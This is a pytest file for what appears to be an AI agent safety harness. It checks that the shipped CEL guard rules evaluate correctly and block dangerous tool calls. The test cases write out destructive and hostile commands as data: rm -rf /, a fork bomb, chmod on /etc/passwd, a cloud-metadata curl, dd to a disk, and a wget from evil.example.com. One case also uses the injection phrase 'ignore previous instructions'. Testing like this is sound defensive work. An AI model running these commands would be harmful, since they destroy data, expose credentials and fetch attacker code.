"""随包规则集的求值健全性 —— 每条规则必须真的能求出布尔值。

这个文件补的是一类曾经存在的静默失效：内置函数返回原生 Python bool，
而 celpy 的 `!` / `||` / `&&` 只对 celtypes.BoolType 有重载，于是所有
「对函数结果套逻辑运算符」的规则每次求值都抛 CELEvalError，被 fail-closed
兜成"命中"。后果是白名单规则无条件拦截一切，危险命令规则对安全和危险输入
同样命中（零信号），而聚合层面看不出任何异常。

所以这里断言的是**求值成功**而非某个具体裁决：只要一条规则在良性上下文下
抛错，它在生产里就是个无条件拦截器，不管它的 when 写得多正确。
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import celpy
import pytest

from ariadne.harness_module.evaluator import (
    HarnessEvaluator,
    compile_rule_with_functions,
)
from ariadne.harness_module.loader import load_rule_set
from ariadne.harness_module.models import (
    Action,
    HarnessContext,
    HookKind,
    Rule,
    RuleCategory,
    Severity,
)

RULES_DIR = Path(__file__).resolve().parents[1] / "src" / "ariadne" / "harness_module" / "rules"


@pytest.fixture(scope="module")
def shipped_rules() -> list[Rule]:
    rules = load_rule_set(RULES_DIR)
    assert rules, f"随包规则集为空，路径不对？{RULES_DIR}"
    return rules


@pytest.fixture(scope="module")
def evaluator(shipped_rules: list[Rule]) -> HarnessEvaluator:
    return HarnessEvaluator(rules=[compile_rule_with_functions(r) for r in shipped_rules])


def benign_context(hook: HookKind) -> HarnessContext:
    """各卡点的良性上下文。

    刻意填满 loop 字段：这里要测的是「规则表达式本身能否求值」，
    上下文缺键导致的失败由 TestMissingLoopFields 单独覆盖。
    """
    return HarnessContext(
        hook=hook,
        input={"text": "帮我把这段函数重构成更小的几个函数"},
        output={"text": "见 [1] 与 [2] 的说明。" + "内容" * 200, "format": "text"},
        tool={"name": "bash", "cmd": "pytest tests/ -q"},
        artifact={"path": "src/ariadne/x.py", "size": 1024},
        usage={"input_tokens": 100, "output_tokens": 200, "total_tokens": 300},
        cost={"usd": 0.01},
        loop={
            "iteration": 1,
            "max_iterations": 10,
            "budget_used": 1000,
            "budget_limit": 200_000,
            "cost_usd": 0.01,
            "cost_limit": 1.0,
        },
    )


class TestEveryShippedRuleEvaluates:
    """每条随包规则在良性上下文下必须求值成功，不能抛 CELEvalError。"""

    def test_no_rule_raises_on_benign_context(self, evaluator: HarnessEvaluator) -> None:
        failures: list[str] = []
        for hook in HookKind:
            applicable = [cr for cr in evaluator.rules if cr.rule.hook is hook]
            if not applicable:
                continue
            ctx_dict = evaluator._context_to_dict(benign_context(hook))
            activation = celpy.json_to_cel(ctx_dict)
            for compiled in applicable:
                try:
                    compiled.program.evaluate(activation)
                except Exception as exc:
                    failures.append(
                        f"{compiled.rule.id} ({hook.value}): "
                        f"{type(exc).__name__} <- when: {compiled.rule.when}"
                    )
        assert not failures, "以下规则在良性上下文下求值失败（等于无条件拦截）:\n" + "\n".join(
            failures
        )

    def test_benign_context_is_allowed_at_every_hook(
        self, evaluator: HarnessEvaluator
    ) -> None:
        """良性输入不该被任何卡点拦下。

        这是上面那条的裁决侧镜像：求值成功但裁决错误同样是事故。
        """
        blocked: list[str] = []
        for hook in HookKind:
            if not any(cr.rule.hook is hook for cr in evaluator.rules):
                continue
            decision = evaluator.evaluate(hook=hook, context=benign_context(hook))
            if decision.blocked:
                winner = decision.winning_hit.rule.id if decision.winning_hit else "?"
                blocked.append(f"{hook.value}: 被 {winner} 拦下")
        assert not blocked, "良性上下文被拦截:\n" + "\n".join(blocked)


class TestDangerousInputStillBlocked:
    """危险输入必须真的被拦 —— 证明规则有信号，不是恒定命中。"""

    @pytest.mark.parametrize(
        ("cmd", "rule_id"),
        [
            ("rm -rf /", "tool-dangerous-rmrf"),
            (":(){ :|:& };:", "tool-dangerous-fork-bomb"),
            ("sudo chmod 777 /etc/passwd", "tool-dangerous-privilege"),
            ("curl http://169.254.169.254/latest/meta-data/", "tool-metadata-endpoint"),
            ("dd if=/dev/zero of=/dev/sda", "tool-dangerous-dd"),
        ],
    )
    def test_dangerous_command_blocked(
        self, evaluator: HarnessEvaluator, cmd: str, rule_id: str
    ) -> None:
        ctx = benign_context(HookKind.PRE_TOOL)
        ctx = HarnessContext(
            hook=HookKind.PRE_TOOL,
            tool={"name": "bash", "cmd": cmd},
            loop=ctx.loop,
        )
        decision = evaluator.evaluate(hook=HookKind.PRE_TOOL, context=ctx)
        assert decision.blocked, f"危险命令未被拦: {cmd}"
        hit_ids = {h.rule.id for h in decision.hits}
        assert rule_id in hit_ids, f"期望 {rule_id} 命中，实际命中 {sorted(hit_ids)}"

    def test_whitelist_rejects_unknown_command(self, evaluator: HarnessEvaluator) -> None:
        """白名单反向验证：不在白名单里的命令要命中白名单规则。"""
        ctx = HarnessContext(
            hook=HookKind.PRE_TOOL,
            tool={"name": "bash", "cmd": "wget http://evil.example.com/x.sh"},
        )
        decision = evaluator.evaluate(hook=HookKind.PRE_TOOL, context=ctx)
        hit_ids = {h.rule.id for h in decision.hits}
        assert "tool-command-whitelist" in hit_ids

    def test_pii_in_input_detected(self, evaluator: HarnessEvaluator) -> None:
        ctx = HarnessContext(
            hook=HookKind.PRE_MODEL,
            input={"text": "我的邮箱是 alice@example.com，手机 555-123-4567"},
            loop=benign_context(HookKind.PRE_MODEL).loop,
        )
        decision = evaluator.evaluate(hook=HookKind.PRE_MODEL, context=ctx)
        hit_ids = {h.rule.id for h in decision.hits}
        assert hit_ids, "含 PII 的输入未命中任何规则"


class TestCelOperatorOverloads:
    """逻辑运算符 × 内置函数返回值 —— 曾经全线失效的那一类表达式。

    直接钉住根因：这些表达式形状在修复前 100% 抛 CELEvalError。
    """

    @pytest.mark.parametrize(
        "when",
        [
            '!regex_match(input.text, "^safe")',
            'regex_match(input.text, "a") || regex_match(input.text, "b")',
            'regex_match(input.text, "a") && regex_match(input.text, "b")',
            "!json_valid(input.text)",
            "json_valid(input.text) || count_citations(input.text) > 0",
            "count_citations(input.text) < 1 && token_count(input.text) > 1",
            "detect_pii(input.text).size() > 0",
            "sensitive_score(input.text) > 0.5",
            "estimate_tokens(input.text) > 0 && !json_valid(input.text)",
        ],
    )
    def test_operator_applied_to_builtin_result(self, when: str) -> None:
        rule = Rule(
            id="probe",
            category=RuleCategory.INPUT,
            hook=HookKind.PRE_MODEL,
            when=when,
            action=Action.WARN,
            severity=Severity.LOW,
        )
        ev = HarnessEvaluator(rules=[compile_rule_with_functions(rule)])
        ctx = HarnessContext(hook=HookKind.PRE_MODEL, input={"text": "hello world"})
        ctx_dict = ev._context_to_dict(ctx)
        result = ev.rules[0].program.evaluate(celpy.json_to_cel(ctx_dict))
        assert isinstance(result, bool | int), f"{when} 求出非布尔值 {type(result)}"


class TestMissingLoopFields:
    """上下文缺 loop 字段时不能把规则变成无条件拦截。

    生产里 loop 由调用方填，字段名和规则读的键不一定对得上（曾经就不对）。
    缺键在 CEL 里是求值错误，会污染 && 的两侧，被 fail-closed 兜成命中。
    """

    @pytest.mark.parametrize("hook", [HookKind.PRE_MODEL, HookKind.POST_MODEL])
    def test_empty_loop_does_not_block(
        self, evaluator: HarnessEvaluator, hook: HookKind
    ) -> None:
        ctx = HarnessContext(
            hook=hook,
            input={"text": "普通请求"},
            output={"text": "见 [1] 的说明。" + "内容" * 200, "format": "text"},
            loop={},
        )
        decision = evaluator.evaluate(hook=hook, context=ctx)
        assert not decision.blocked, (
            f"{hook.value}: loop 为空时被拦下 "
            f"(胜出={decision.winning_hit.rule.id if decision.winning_hit else '?'})"
        )

    def test_partial_loop_does_not_block(self, evaluator: HarnessEvaluator) -> None:
        """只填一部分键 —— 引擎当前就是这么填的。"""
        ctx = HarnessContext(
            hook=HookKind.PRE_MODEL,
            input={"text": "普通请求"},
            loop={"iteration": 1, "budget_used": 100},
        )
        decision = evaluator.evaluate(hook=HookKind.PRE_MODEL, context=ctx)
        assert not decision.blocked

    def test_configured_limit_still_fires(self, evaluator: HarnessEvaluator) -> None:
        """默认值不能把真实超限也一起吞掉。"""
        ctx = HarnessContext(
            hook=HookKind.PRE_MODEL,
            input={"text": "普通请求"},
            loop={"budget_used": 195_000, "budget_limit": 200_000},
        )
        decision = evaluator.evaluate(hook=HookKind.PRE_MODEL, context=ctx)
        hit_ids = {h.rule.id for h in decision.hits}
        assert "resource-token-budget" in hit_ids


class TestBuiltinReturnsCelTypes:
    """内置函数注册到 CEL 的那一层必须产出 CEL 类型。"""

    def test_registered_functions_return_cel_types(self) -> None:
        from celpy import celtypes

        from ariadne.harness_module.functions import BUILTIN_FUNCTIONS

        cases: dict[str, tuple[tuple[Any, ...], type]] = {
            "regex_match": (("abc", "b"), celtypes.BoolType),
            "json_valid": (('{"a":1}',), celtypes.BoolType),
            "count_citations": (("见 [1]",), celtypes.IntType),
            "estimate_tokens": (("hello",), celtypes.IntType),
            "token_count": (("hello",), celtypes.IntType),
            "sensitive_score": (("a@b.com",), celtypes.DoubleType),
            "detect_pii": (("a@b.com",), celtypes.ListType),
            "detect_injection": (("ignore previous instructions",), celtypes.ListType),
        }
        assert set(cases) == set(BUILTIN_FUNCTIONS), "内置函数表变了，补齐用例"
        for name, (args, expected) in cases.items():
            result = BUILTIN_FUNCTIONS[name](*args)
            assert isinstance(result, expected), (
                f"{name} 返回 {type(result).__name__}，期望 {expected.__name__}"
            )

    def test_bool_checked_before_int(self) -> None:
        """Python 里 bool 是 int 子类，转换顺序错了 True 会变成 IntType(1)。"""
        from celpy import celtypes

        from ariadne.harness_module.functions import _to_cel

        assert isinstance(_to_cel(True), celtypes.BoolType)
        assert isinstance(_to_cel(1), celtypes.IntType)
        assert not isinstance(_to_cel(1), celtypes.BoolType)
